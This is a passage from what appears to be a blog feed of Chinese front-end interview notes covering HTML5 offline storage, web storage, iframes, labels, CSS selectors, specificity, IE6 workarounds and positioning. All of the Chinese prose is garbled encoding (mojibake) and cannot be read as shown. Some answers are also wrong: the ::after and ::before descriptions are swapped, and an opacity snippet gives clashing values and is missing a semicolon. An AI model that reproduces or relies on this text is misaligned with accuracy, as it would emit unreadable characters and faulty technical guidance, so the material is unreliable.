è¯­ä¹‰åŒ–è®©é¡µé¢çš„å†…å®¹ç»“æž„åŒ–ï¼Œç»“æž„æ›´æ¸…æ™°ï¼Œä¾¿äºŽå¯¹æµè§ˆå™¨ã€æœç´¢å¼•æ“Žè§£æž; å³ä½¿åœ¨æ²¡æœ‰æ ·å¼ CSS æƒ…å†µä¸‹ä¹Ÿä»¥ä¸€ç§æ–‡æ¡£æ ¼å¼æ˜¾ç¤ºï¼Œå¹¶ä¸”æ˜¯å®¹æ˜“é˜…è¯»çš„; æœç´¢å¼•æ“Žçš„çˆ¬è™«ä¹Ÿä¾èµ–äºŽ HTML æ ‡è®°æ¥ç¡®å®šä¸Šä¸‹æ–‡å’Œå„ä¸ªå…³é”®å­—çš„æƒé‡ï¼Œåˆ©äºŽ SEO; ä½¿é˜…è¯»æºä»£ç çš„äººå¯¹ç½‘ç«™æ›´å®¹æ˜“å°†ç½‘ç«™åˆ†å—ï¼Œä¾¿äºŽé˜…è¯»ç»´æŠ¤ç†è§£ã€‚ HTML5 çš„ç¦»çº¿å‚¨å­˜æ€Žä¹ˆä½¿ç”¨ï¼Œå·¥ä½œåŽŸç†èƒ½ä¸èƒ½è§£é‡Šä¸€ä¸‹ï¼Ÿ åœ¨ç”¨æˆ·æ²¡æœ‰ä¸Žå› ç‰¹ç½‘è¿žæŽ¥æ—¶ï¼Œå¯ä»¥æ­£å¸¸è®¿é—®ç«™ç‚¹æˆ–åº”ç”¨ï¼Œåœ¨ç”¨æˆ·ä¸Žå› ç‰¹ç½‘è¿žæŽ¥æ—¶ï¼Œæ›´æ–°ç”¨æˆ·æœºå™¨ä¸Šçš„ç¼“å­˜æ–‡ä»¶ã€‚ åŽŸç†ï¼šHTML5 çš„ç¦»çº¿å­˜å‚¨æ˜¯åŸºäºŽä¸€ä¸ªæ–°å»ºçš„.appcache æ–‡ä»¶çš„ç¼“å­˜æœºåˆ¶(ä¸æ˜¯å­˜å‚¨æŠ€æœ¯)ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶ä¸Šçš„è§£æžæ¸…å•ç¦»çº¿å­˜å‚¨èµ„æºï¼Œè¿™äº›èµ„æºå°±ä¼šåƒ cookie ä¸€æ ·è¢«å­˜å‚¨äº†ä¸‹æ¥ã€‚ä¹‹åŽå½“ç½‘ç»œåœ¨å¤„äºŽç¦»çº¿çŠ¶æ€ä¸‹æ—¶ï¼Œæµè§ˆå™¨ä¼šé€šè¿‡è¢«ç¦»çº¿å­˜å‚¨çš„æ•°æ®è¿›è¡Œé¡µé¢å±•ç¤ºã€‚ å¦‚ä½•ä½¿ç”¨ï¼š é¡µé¢å¤´éƒ¨åƒä¸‹é¢ä¸€æ ·åŠ å…¥ä¸€ä¸ª manifest çš„å±žæ€§ï¼› åœ¨ cache.manifest æ–‡ä»¶çš„ç¼–å†™ç¦»çº¿å­˜å‚¨çš„èµ„æºï¼› 123456789CACHE MANIFEST#v0.11CACHE:js/app.jscss/style.cssNETWORK:resourse/logo.pngFALLBACK:/ /offline.html åœ¨ç¦»çº¿çŠ¶æ€æ—¶ï¼Œæ“ä½œ window.applicationCache è¿›è¡Œéœ€æ±‚å®žçŽ°ã€‚ æµè§ˆå™¨æ˜¯æ€Žä¹ˆå¯¹ HTML5 çš„ç¦»çº¿å‚¨å­˜èµ„æºè¿›è¡Œç®¡ç†å’ŒåŠ è½½çš„å‘¢ï¼Ÿ åœ¨çº¿çš„æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨å‘çŽ° html å¤´éƒ¨æœ‰ manifest å±žæ€§ï¼Œå®ƒä¼šè¯·æ±‚ manifest æ–‡ä»¶ï¼Œå¦‚æžœæ˜¯ç¬¬ä¸€æ¬¡è®¿é—® appï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¼šæ ¹æ® manifest æ–‡ä»¶çš„å†…å®¹ä¸‹è½½ç›¸åº”çš„èµ„æºå¹¶ä¸”è¿›è¡Œç¦»çº¿å­˜å‚¨ã€‚å¦‚æžœå·²ç»è®¿é—®è¿‡ app å¹¶ä¸”èµ„æºå·²ç»ç¦»çº¿å­˜å‚¨äº†ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¼šä½¿ç”¨ç¦»çº¿çš„èµ„æºåŠ è½½é¡µé¢ï¼Œç„¶åŽæµè§ˆå™¨ä¼šå¯¹æ¯”æ–°çš„ manifest æ–‡ä»¶ä¸Žæ—§çš„ manifest æ–‡ä»¶ï¼Œå¦‚æžœæ–‡ä»¶æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œå°±ä¸åšä»»ä½•æ“ä½œï¼Œå¦‚æžœæ–‡ä»¶æ”¹å˜äº†ï¼Œé‚£ä¹ˆå°±ä¼šé‡æ–°ä¸‹è½½æ–‡ä»¶ä¸­çš„èµ„æºå¹¶è¿›è¡Œç¦»çº¿å­˜å‚¨ã€‚ ç¦»çº¿çš„æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨å°±ç›´æŽ¥ä½¿ç”¨ç¦»çº¿å­˜å‚¨çš„èµ„æºã€‚ è¯·æè¿°ä¸€ä¸‹ cookiesï¼ŒsessionStorage å’Œ localStorage çš„åŒºåˆ«ï¼Ÿ ä¼ é€’æ€§ cookie æ˜¯ç½‘ç«™ä¸ºäº†æ ‡ç¤ºç”¨æˆ·èº«ä»½è€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ï¼ˆClient Sideï¼‰ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰ã€‚cookie æ•°æ®å§‹ç»ˆåœ¨åŒæºçš„ http è¯·æ±‚ä¸­æºå¸¦ï¼ˆå³ä½¿ä¸éœ€è¦ï¼‰ï¼Œä¹Ÿä¼šåœ¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨é—´æ¥å›žä¼ é€’ã€‚ sessionStorage å’Œ localStorage ä¸ä¼šè‡ªåŠ¨æŠŠæ•°æ®å‘ç»™æœåŠ¡å™¨ï¼Œä»…åœ¨æœ¬åœ°ä¿å­˜ã€‚ å­˜å‚¨å¤§å°ï¼š cookie æ•°æ®å¤§å°ä¸èƒ½è¶…è¿‡ 4kã€‚ sessionStorage å’Œ localStorage è™½ç„¶ä¹Ÿæœ‰å­˜å‚¨å¤§å°çš„é™åˆ¶ï¼Œä½†æ¯” cookie å¤§å¾—å¤šï¼Œå¯ä»¥è¾¾åˆ° 5M æˆ–æ›´å¤§ã€‚ æœ‰æœŸæ—¶é—´ï¼š localStorage å­˜å‚¨æŒä¹…æ•°æ®ï¼Œæµè§ˆå™¨å…³é—­åŽæ•°æ®ä¸ä¸¢å¤±é™¤éžä¸»åŠ¨åˆ é™¤æ•°æ®ï¼› sessionStorage æ•°æ®åœ¨å½“å‰æµè§ˆå™¨çª—å£å…³é—­åŽè‡ªåŠ¨åˆ é™¤ã€‚ cookie è®¾ç½®çš„ cookie è¿‡æœŸæ—¶é—´ä¹‹å‰ä¸€ç›´æœ‰æ•ˆï¼Œå³ä½¿çª—å£æˆ–æµè§ˆå™¨å…³é—­ iframe æœ‰é‚£äº›ç¼ºç‚¹ï¼Ÿ iframe ä¼šé˜»å¡žä¸»é¡µé¢çš„ Onload äº‹ä»¶ï¼› æœç´¢å¼•æ“Žçš„æ£€ç´¢ç¨‹åºæ— æ³•è§£è¯»è¿™ç§é¡µé¢ï¼Œä¸åˆ©äºŽ SEO; iframe å’Œä¸»é¡µé¢å…±äº«è¿žæŽ¥æ± ï¼Œè€Œæµè§ˆå™¨å¯¹ç›¸åŒåŸŸçš„è¿žæŽ¥æœ‰é™åˆ¶ï¼Œæ‰€ä»¥ä¼šå½±å“é¡µé¢çš„å¹¶è¡ŒåŠ è½½ã€‚ ä½¿ç”¨ iframe ä¹‹å‰éœ€è¦è€ƒè™‘è¿™ä¸¤ä¸ªç¼ºç‚¹ã€‚å¦‚æžœéœ€è¦ä½¿ç”¨ iframeï¼Œæœ€å¥½æ˜¯é€šè¿‡ javascriptåŠ¨æ€ç»™ iframe æ·»åŠ  src å±žæ€§å€¼ï¼Œè¿™æ ·å¯ä»¥ç»•å¼€ä»¥ä¸Šä¸¤ä¸ªé—®é¢˜ã€‚ Label çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯æ€Žä¹ˆç”¨çš„ï¼Ÿlabel æ ‡ç­¾æ¥å®šä¹‰è¡¨å•æŽ§åˆ¶é—´çš„å…³ç³»,å½“ç”¨æˆ·é€‰æ‹©è¯¥æ ‡ç­¾æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å°†ç„¦ç‚¹è½¬åˆ°å’Œæ ‡ç­¾ç›¸å…³çš„è¡¨å•æŽ§ä»¶ä¸Šã€‚ 1234&lt;label for="Name"&gt;Number:&lt;/label&gt;&lt;input type="text" name="Name" id="Name" /&gt;&lt;label&gt;Date:&lt;input type="text" name="B" /&gt;&lt;/label&gt; HTML5 çš„ form å¦‚ä½•å…³é—­è‡ªåŠ¨å®ŒæˆåŠŸèƒ½ï¼Ÿç»™ä¸æƒ³è¦æç¤ºçš„ form æˆ–æŸä¸ª input è®¾ç½®ä¸º autocomplete=&quot;off&quot;ã€‚ å¦‚ä½•å®žçŽ°æµè§ˆå™¨å†…å¤šä¸ªæ ‡ç­¾é¡µä¹‹é—´çš„é€šä¿¡? WebSocketã€SharedWorkerï¼› ä¹Ÿå¯ä»¥è°ƒç”¨ localstorgeã€cookies ç­‰æœ¬åœ°å­˜å‚¨æ–¹å¼ï¼› localstorge å¦ä¸€ä¸ªæµè§ˆä¸Šä¸‹æ–‡é‡Œè¢«æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤æ—¶ï¼Œå®ƒéƒ½ä¼šè§¦å‘ä¸€ä¸ª storagechange äº‹ä»¶ï¼Œæˆ‘ä»¬é€šè¿‡ç›‘å¬äº‹ä»¶ï¼ŒæŽ§åˆ¶å®ƒçš„å€¼æ¥è¿›è¡Œé¡µé¢ä¿¡æ¯é€šä¿¡ï¼›æ³¨æ„ quirksï¼šSafari åœ¨æ— ç—•æ¨¡å¼ä¸‹è®¾ç½® localstorge å€¼æ—¶ä¼šæŠ›å‡º QuotaExceededError çš„å¼‚å¸¸ï¼› webSocket å¦‚ä½•å…¼å®¹ä½Žæµè§ˆå™¨ï¼Ÿ Adobe Flash Socket ActiveX HTMLFile (IE) åŸºäºŽ multipart ç¼–ç å‘é€ XHR åŸºäºŽé•¿è½®è¯¢çš„ XHR é¡µé¢å¯è§æ€§ï¼ˆPage Visibility APIï¼‰ å¯ä»¥æœ‰å“ªäº›ç”¨é€”ï¼Ÿ é€šè¿‡ç›‘å¬é¡µé¢visibilitychangeäº‹ä»¶ï¼Œç”¨document.hidden çš„å€¼æ£€æµ‹é¡µé¢å½“å‰æ˜¯å¦å¯è§ï¼Œä»¥åŠæ‰“å¼€ç½‘é¡µçš„æ—¶é—´ç­‰; åœ¨é¡µé¢è¢«åˆ‡æ¢åˆ°å…¶ä»–åŽå°è¿›ç¨‹çš„æ—¶å€™ï¼Œè‡ªåŠ¨æš‚åœéŸ³ä¹æˆ–è§†é¢‘çš„æ’­æ”¾ï¼› å¦‚ä½•åœ¨é¡µé¢ä¸Šå®žçŽ°ä¸€ä¸ªåœ†å½¢çš„å¯ç‚¹å‡»åŒºåŸŸï¼Ÿ map+area æˆ–è€… svg border-radius çº¯ js å®žçŽ° éœ€è¦æ±‚ä¸€ä¸ªç‚¹åœ¨ä¸åœ¨åœ†ä¸Šç®€å•ç®—æ³•ã€èŽ·å–é¼ æ ‡åæ ‡ç­‰ç­‰ å®žçŽ°ä¸ä½¿ç”¨ border ç”»å‡º 1px é«˜çš„çº¿ï¼Œåœ¨ä¸åŒæµè§ˆå™¨çš„æ ‡å‡†æ¨¡å¼ä¸Žæ€ªå¼‚æ¨¡å¼ä¸‹éƒ½èƒ½ä¿æŒä¸€è‡´çš„æ•ˆæžœ&lt;div style=&quot;height:1px;overflow:hidden;background:red&quot;&gt;&lt;/div&gt; ç½‘é¡µéªŒè¯ç æ˜¯å¹²å˜›çš„ï¼Œæ˜¯ä¸ºäº†è§£å†³ä»€ä¹ˆå®‰å…¨é—®é¢˜ï¼Ÿ åŒºåˆ†ç”¨æˆ·æ˜¯è®¡ç®—æœºè¿˜æ˜¯äººçš„å…¬å…±å…¨è‡ªåŠ¨ç¨‹åºã€‚å¯ä»¥é˜²æ­¢æ¶æ„ç ´è§£å¯†ç ã€åˆ·ç¥¨ã€è®ºå›çŒæ°´ï¼› æœ‰æ•ˆé˜²æ­¢é»‘å®¢å¯¹æŸä¸€ä¸ªç‰¹å®šæ³¨å†Œç”¨æˆ·ç”¨ç‰¹å®šç¨‹åºæš´åŠ›ç ´è§£æ–¹å¼è¿›è¡Œä¸æ–­çš„ç™»é™†å°è¯•ã€‚ title ä¸Ž h1 çš„åŒºåˆ«ã€b ä¸Ž strong çš„åŒºåˆ«ã€i ä¸Ž em çš„åŒºåˆ«ï¼Ÿ title å±žæ€§æ²¡æœ‰æ˜Žç¡®æ„ä¹‰åªè¡¨ç¤ºæ˜¯ä¸ªæ ‡é¢˜ï¼ŒH1 åˆ™è¡¨ç¤ºå±‚æ¬¡æ˜Žç¡®çš„æ ‡é¢˜ï¼Œå¯¹é¡µé¢ä¿¡æ¯çš„æŠ“å–ä¹Ÿæœ‰å¾ˆå¤§çš„å½±å“ï¼› strong æ˜¯æ ‡æ˜Žé‡ç‚¹å†…å®¹ï¼Œæœ‰è¯­æ°”åŠ å¼ºçš„å«ä¹‰ï¼Œä½¿ç”¨é˜…è¯»è®¾å¤‡é˜…è¯»ç½‘ç»œæ—¶ï¼š&lt;strong&gt;ä¼šé‡è¯»ï¼Œè€Œ&lt;B&gt;æ˜¯å±•ç¤ºå¼ºè°ƒå†…å®¹ã€‚ i å†…å®¹å±•ç¤ºä¸ºæ–œä½“ï¼Œem è¡¨ç¤ºå¼ºè°ƒçš„æ–‡æœ¬ï¼› Physical Style Elements â€“ è‡ªç„¶æ ·å¼æ ‡ç­¾b, i, u, s, pre Semantic Style Elements â€“ è¯­ä¹‰æ ·å¼æ ‡ç­¾strong, em, ins, del, code åº”è¯¥å‡†ç¡®ä½¿ç”¨è¯­ä¹‰æ ·å¼æ ‡ç­¾, ä½†ä¸èƒ½æ»¥ç”¨, å¦‚æžœä¸èƒ½ç¡®å®šæ—¶é¦–é€‰ä½¿ç”¨è‡ªç„¶æ ·å¼æ ‡ç­¾ã€‚]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•ä¹‹css]]></title>
    <url>%2F2018%2F03%2F04%2Finter-css%2F</url>
    <content type="text"><![CDATA[Front-end-Developer-Questions FE-interview ä»‹ç»ä¸€ä¸‹æ ‡å‡†çš„ CSS çš„ç›’å­æ¨¡åž‹ï¼Ÿä½Žç‰ˆæœ¬ IE çš„ç›’å­æ¨¡åž‹æœ‰ä»€ä¹ˆä¸åŒçš„ï¼Ÿ æœ‰ä¸¤ç§ï¼šIE ç›’æ¨¡åž‹ã€W3C ç›’æ¨¡åž‹ ç›’æ¨¡åž‹ï¼šå†…å®¹ï¼ˆcontentï¼‰ã€å¡«å……ï¼ˆpaddingï¼‰ã€è¾¹æ¡†ï¼ˆborderï¼‰ã€è¾¹ç•Œï¼ˆmarginï¼‰ åŒºåˆ«ï¼šIE ç›’æ¨¡åž‹box-sizingä¸ºborder-boxï¼ŒæŠŠ border å’Œ padding è®¡ç®—åœ¨å†… CSS é€‰æ‹©ç¬¦æœ‰å“ªäº›ï¼Ÿå“ªäº›å±žæ€§å¯ä»¥ç»§æ‰¿ï¼Ÿé€‰æ‹©ç¬¦æœ‰ï¼š id é€‰æ‹©å™¨ï¼ˆ#myidï¼‰ ç±»é€‰æ‹©å™¨ï¼ˆ.myclassï¼‰ æ ‡ç­¾é€‰æ‹©å™¨ï¼ˆdiv, h1, pï¼‰ ç›¸é‚»é€‰æ‹©å™¨ï¼ˆh1 + pï¼‰ å­é€‰æ‹©å™¨ï¼ˆul &gt; liï¼‰ åŽä»£é€‰æ‹©å™¨ï¼ˆli aï¼‰ é€šé…ç¬¦é€‰æ‹©å™¨ï¼ˆ*ï¼‰ å±žæ€§é€‰æ‹©å™¨ï¼ˆinput[type=â€radioâ€]ï¼‰ ä¼ªç±»é€‰æ‹©å™¨ï¼ˆa:hover, li:nth-childï¼‰ å¯ç»§æ‰¿çš„æ ·å¼ï¼š æ–‡å­—æŽ’ç‰ˆç›¸å…³å±žæ€§ font word-break letter-spacing text-align text-rendering word-space text-indent text-transform text-shadow color line-height cursor visibility ä¸å¯ç»§æ‰¿æ ·å¼ï¼šborderã€paddingã€marginã€widthã€height CSS ä¼˜å…ˆçº§ç®—æ³•å¦‚ä½•è®¡ç®—ï¼Ÿ ä¼˜å…ˆçº§å°±è¿‘åŽŸåˆ™ï¼ŒåŒæƒé‡æƒ…å†µä¸‹æ ·å¼å®šä¹‰æœ€è¿‘è€…ä¸ºå‡† è½½å…¥æ ·å¼ä»¥æœ€åŽè½½å…¥çš„å®šä½ä¸ºå‡† ä¼˜å…ˆçº§ åŒæƒé‡: å†…è”æ ·å¼è¡¨ï¼ˆæ ‡ç­¾å†…éƒ¨ï¼‰&gt; åµŒå…¥æ ·å¼è¡¨ï¼ˆå½“å‰æ–‡ä»¶ä¸­ï¼‰&gt; å¤–éƒ¨æ ·å¼è¡¨ï¼ˆå¤–éƒ¨æ–‡ä»¶ä¸­ï¼‰ã€‚ !important &gt; id &gt; class &gt; tagimportant æ¯” å†…è”ä¼˜å…ˆçº§é«˜ css sprite æ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿå°†å¤šä¸ªå°å›¾ç‰‡æ‹¼æŽ¥åˆ°ä¸€å¼ å›¾ç‰‡ç§ã€‚é€šè¿‡background-positionå’Œå…ƒç´ å°ºå¯¸è°ƒèŠ‚æ˜¾ç¤ºçš„èƒŒæ™¯å›¾ç‰‡ã€‚ ä¼˜ç‚¹ï¼š å‡å°‘ HTTP è¯·æ±‚æ¬¡æ•°å’Œå›¾ç‰‡æ€»ä½“å¤§å°ï¼Œæé«˜é¡µé¢åŠ è½½é€Ÿåº¦ æ›´æ¢é£Žæ ¼æ–¹ä¾¿ï¼Œåªéœ€å†ä¸€å¼ æˆ–å‡ å¼ å›¾ç‰‡ä¸Šä¿®æ”¹é¢œè‰² ç¼ºç‚¹ï¼š å›¾ç‰‡åˆå¹¶éº»çƒ¦ IE6 æµè§ˆå™¨æœ‰å“ªäº›å¸¸è§çš„ bug,ç¼ºé™·æˆ–è€…ä¸Žæ ‡å‡†ä¸ä¸€è‡´çš„åœ°æ–¹,å¦‚ä½•è§£å†³ï¼Ÿ IE6 ä¸æ”¯æŒ min-heightï¼Œè§£å†³åŠžæ³•ä½¿ç”¨ css hackï¼š 12345.target &#123; min-height: 100px; height: auto !important; height: 100px; // IE6ä¸‹å†…å®¹é«˜åº¦è¶…è¿‡ä¼šè‡ªåŠ¨æ‰©å±•é«˜åº¦&#125; ol å†… li çš„åºå·å…¨ä¸º 1ï¼Œä¸é€’å¢žã€‚è§£å†³æ–¹æ³•ï¼šä¸º li è®¾ç½®æ ·å¼display: list-item; æœªå®šä½çˆ¶å…ƒç´ overflow: auto;ï¼ŒåŒ…å«position: relative;å­å…ƒç´ ï¼Œå­å…ƒç´ é«˜äºŽçˆ¶å…ƒç´ æ—¶ä¼šæº¢å‡ºã€‚è§£å†³åŠžæ³•ï¼š å­å…ƒç´ åŽ»æŽ‰position: relativeï¼›ï¼› ä¸èƒ½ä¸ºå­å…ƒç´ åŽ»æŽ‰å®šä½æ—¶ï¼Œçˆ¶å…ƒç´ position: relativeï¼›; 12345678910111213141516171819&lt;style type="text/css"&gt; .outer &#123; width: 215px; height: 100px; border: 1px solid red; overflow: auto; position: relative; /* ä¿®å¤bug */ &#125; .inner &#123; width: 100px; height: 200px; background-color: purple; position: relative; &#125;&lt;/style&gt;&lt;div class="outer"&gt; &lt;div class="inner"&gt;&lt;/div&gt;&lt;/div&gt; IE6 åªæ”¯æŒ a æ ‡ç­¾çš„:hover ä¼ªç±»ï¼Œè§£å†³æ–¹æ³•ï¼šä½¿ç”¨ js ä¸ºå…ƒç´ ç›‘å¬ mouseenterï¼Œmouseleave äº‹ä»¶ï¼Œæ·»åŠ ç±»å®žçŽ°æ•ˆæžœï¼š 123456789101112131415161718192021222324252627282930313233&lt;style type="text/css"&gt; .p:hover, .hover &#123; background: purple; &#125;&lt;/style&gt;&lt;p class="p" id="target"&gt;aaaa bbbbb&lt;span&gt;DDDDDDDDDDDd&lt;/span&gt; aaaa lkjlkjdf j&lt;/p&gt;&lt;script type="text/javascript"&gt; function addClass(elem, cls) &#123; if (elem.className) &#123; elem.className += ' ' + cls &#125; else &#123; elem.className = cls &#125; &#125; function removeClass(elem, cls) &#123; var className = ' ' + elem.className + ' ' var reg = new RegExp(' +' + cls + ' +', 'g') elem.className = className.replace(reg, ' ').replace(/^ +| +$/, '') &#125; var target = document.getElementById('target') if (target.attachEvent) &#123; target.attachEvent('onmouseenter', function () &#123; addClass(target, 'hover') &#125;) target.attachEvent('onmouseleave', function () &#123; removeClass(target, 'hover') &#125;) &#125;&lt;/script&gt; IE5-8 ä¸æ”¯æŒ opacityï¼Œè§£å†³åŠžæ³•ï¼š 12345.opacity &#123; opacity: 0.4 filter: alpha(opacity=60); /* for IE5-7 */ -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=60)"; /* for IE 8*/&#125; IE6 åœ¨è®¾ç½® height å°äºŽ font-size æ—¶é«˜åº¦å€¼ä¸º font-sizeï¼Œè§£å†³åŠžæ³•ï¼šfont-size: 0; IE6 ä¸æ”¯æŒ PNG é€æ˜ŽèƒŒæ™¯ï¼Œè§£å†³åŠžæ³•: IE6 ä¸‹ä½¿ç”¨ gif å›¾ç‰‡ IE6-7 ä¸æ”¯æŒ display: inline-block è§£å†³åŠžæ³•ï¼šè®¾ç½® inline å¹¶è§¦å‘ hasLayout 123display: inline-block;*display: inline;*zoom: 1; IE6 ä¸‹æµ®åŠ¨å…ƒç´ åœ¨æµ®åŠ¨æ–¹å‘ä¸Šä¸Žçˆ¶å…ƒç´ è¾¹ç•ŒæŽ¥è§¦å…ƒç´ çš„å¤–è¾¹è·ä¼šåŠ å€ã€‚è§£å†³åŠžæ³•ï¼š 1. ä½¿ç”¨ padding æŽ§åˆ¶é—´è·ã€‚ 2. æµ®åŠ¨å…ƒç´ display: inline;è¿™æ ·è§£å†³é—®é¢˜ä¸”æ— ä»»ä½•å‰¯ä½œç”¨ï¼šcss æ ‡å‡†è§„å®šæµ®åŠ¨å…ƒç´ display:inlineä¼šè‡ªåŠ¨è°ƒæ•´ä¸º block é€šè¿‡ä¸ºå—çº§å…ƒç´ è®¾ç½®å®½åº¦å’Œå·¦å³ margin ä¸º auto æ—¶ï¼ŒIE6 ä¸èƒ½å®žçŽ°æ°´å¹³å±…ä¸­ï¼Œè§£å†³æ–¹æ³•ï¼šä¸ºçˆ¶å…ƒç´ è®¾ç½®text-align: center; CSS3 æ–°å¢žä¼ªç±»æœ‰é‚£äº›ï¼Ÿ p:first-of-type é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ çš„é¦–ä¸ª&lt;p&gt;å…ƒç´ çš„æ¯ä¸ª&lt;p&gt;å…ƒç´ ã€‚ p:last-of-type é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ çš„æœ€åŽ&lt;p&gt;å…ƒç´ çš„æ¯ä¸ª&lt;p&gt;å…ƒç´ ã€‚ p:only-of-type é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ å”¯ä¸€çš„&lt;p&gt; å…ƒç´ çš„æ¯ä¸ª&lt;p&gt;å…ƒç´ ã€‚ p:only-child é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ çš„å”¯ä¸€å­å…ƒç´ çš„æ¯ä¸ª&lt;p&gt;å…ƒç´ ã€‚ p:nth-child(2) é€‰æ‹©å±žäºŽå…¶çˆ¶å…ƒç´ çš„ç¬¬äºŒä¸ªå­å…ƒç´ çš„æ¯ä¸ª&lt;p&gt;å…ƒç´ ã€‚ ::after åœ¨å…ƒç´ ä¹‹å‰æ·»åŠ å†…å®¹,ä¹Ÿå¯ä»¥ç”¨æ¥åšæ¸…é™¤æµ®åŠ¨ã€‚ ::before åœ¨å…ƒç´ ä¹‹åŽæ·»åŠ å†…å®¹ :enabled è¡¨å•æŽ§ä»¶å¯ç”¨æˆ–æ¿€æ´»çŠ¶æ€ :disabled æŽ§åˆ¶è¡¨å•æŽ§ä»¶çš„ç¦ç”¨çŠ¶æ€ã€‚ :checked å•é€‰æ¡†æˆ–å¤é€‰æ¡†è¢«é€‰ä¸­ã€‚ å®žçŽ°æ°´å¹³ã€åž‚ç›´å±…ä¸­ï¼Ÿæ°´å¹³ä¸”åž‚ç›´å±…ä¸­æ–¹æ³•ï¼ˆ9 ç§ï¼‰ positionå–å€¼æœ‰å“ªå‡ ç§ï¼Ÿ staticï¼ˆé»˜è®¤ï¼‰ï¼šå…ƒç´ æ¡†æ­£å¸¸ç”Ÿæˆã€‚å—çº§å…ƒç´ ç”Ÿæˆä¸€ä¸ªçŸ©å½¢æ¡†ï¼Œä½œä¸ºæ–‡æ¡£æµçš„ä¸€éƒ¨åˆ†ï¼›è¡Œå†…å…ƒç´ åˆ™ä¼šåˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªè¡Œæ¡†ï¼Œç½®äºŽçˆ¶çº§å…ƒç´ ä¸­ã€‚ relativeï¼šå…ƒç´ æ¡†ç›¸å¯¹äºŽä¹‹å‰æ­£å¸¸æ–‡æ¡£æµä¸­çš„ä½ç½®å‘ç”Ÿåç§»ï¼Œå¹¶ä¸”åŽŸå…ˆçš„ä½ç½®ä»ç„¶è¢«å æ®ã€‚å‘ç”Ÿåç§»çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šè¦†ç›–å…¶ä»–å…ƒç´ ã€‚ absoluteï¼šå…ƒç´ æ¡†ä¸å†å æœ‰æ–‡æ¡£ä½ç½®ï¼Œå¹¶ä¸”ç›¸å¯¹äºŽåŒ…å«å—è¿›è¡Œåç§»ï¼ˆæ‰€è°“åŒ…å«å—å°±æ˜¯æœ€è¿‘ä¸€çº§å¤–å±‚å…ƒç´  position ä¸ä¸º static çš„å…ƒç´ ï¼‰ã€‚ fixedï¼šå…ƒç´ æ¡†ä¸å†å æœ‰æ–‡æ¡£æµä½ç½®ï¼Œå¹¶ä¸”ç›¸å¯¹äºŽè§†çª—è¿›è¡Œå®šä½ã€‚ stickyï¼šcss3 æ–°å¢žå±žæ€§å€¼ï¼Œç²˜æ€§å®šä½ï¼Œç›¸å½“äºŽ relative å’Œ fixed çš„æ··åˆã€‚æœ€åˆä¼šè¢«å½“ä½œæ˜¯ relativeï¼Œç›¸å¯¹åŽŸæ¥ä½ç½®è¿›è¡Œåç§»ï¼›ä¸€æ—¦è¶…è¿‡ä¸€å®šçš„é˜ˆå€¼ï¼Œä¼šè¢«å½“æˆ fixed å®šä½ï¼Œç›¸å¯¹äºŽè§†å£å®šä½ã€‚ æè¿°display: block;å’Œdisplay: inline;çš„å…·ä½“åŒºåˆ«ï¼Ÿblockå…ƒç´ ç‰¹ç‚¹ å¤„äºŽå¸¸è§„æµä¸­æ—¶ï¼Œå¦‚æžœ width æ²¡æœ‰è®¾ç½®ï¼Œä¼šè‡ªåŠ¨å¡«å……æ»¡çˆ¶å®¹å™¨ å¯ä»¥åº”ç”¨ margin/padding åœ¨æ²¡æœ‰è®¾ç½®é«˜åº¦çš„æƒ…å†µä¸‹ä¼šæ‰©å±•é«˜åº¦ä»¥åŒ…å«å¸¸è§„æµä¸­çš„å­å…ƒç´  å¤„äºŽå¸¸è§„æµä¸­æ—¶å¸ƒå±€æ—¶åœ¨å‰åŽå…ƒç´ ä½ç½®ä¹‹é—´ï¼ˆç‹¬å ä¸€ä¸ªæ°´å¹³ç©ºé—´ï¼‰ å¿½ç•¥vertical-align inlineå…ƒç´ ç‰¹ç‚¹ æ°´å¹³æ–¹å‘ä¸Šæ ¹æ® direction ä¾æ¬¡å¸ƒå±€ ä¸ä¼šåœ¨å…ƒç´ å‰åŽè¿›è¡Œæ¢è¡Œ å— white-space æŽ§åˆ¶ margin/padding åœ¨ç«–ç›´æ–¹å‘ä¸Šæ— æ•ˆï¼Œæ°´å¹³æ–¹å‘ä¸Šæœ‰æ•ˆ width/height å±žæ€§å¯¹éžæ›¿æ¢è¡Œå†…å…ƒç´ æ— æ•ˆï¼Œå®½åº¦ç”±å…ƒç´ å†…å®¹å†³å®š éžæ›¿æ¢è¡Œå†…å…ƒç´ çš„è¡Œæ¡†é«˜ç”± line-height ç¡®å®šï¼Œæ›¿æ¢è¡Œå†…å…ƒç´ çš„è¡Œæ¡†é«˜ç”± height,margin,padding,border å†³å®š æµ®åŠ¨æˆ–ç»å¯¹å®šä½æ—¶ä¼šè½¬æ¢ä¸º block vertical-alignå±žæ€§ç”Ÿæ•ˆ ç”¨çº¯ CSS åˆ›å»ºä¸€ä¸ªä¸‰è§’å½¢çš„åŽŸç†æ˜¯ä»€ä¹ˆï¼Ÿä¸€è¾¹è®¾ç½®é¢œè‰²ï¼Œå¦ä¸‰è¾¹é€æ˜Žï¼ˆé¢œè‰²è®¾ä¸ºtransparentï¼‰ çº¯ css ä¸‰è§’å½¢åŠå…¶åº”ç”¨ Chrome 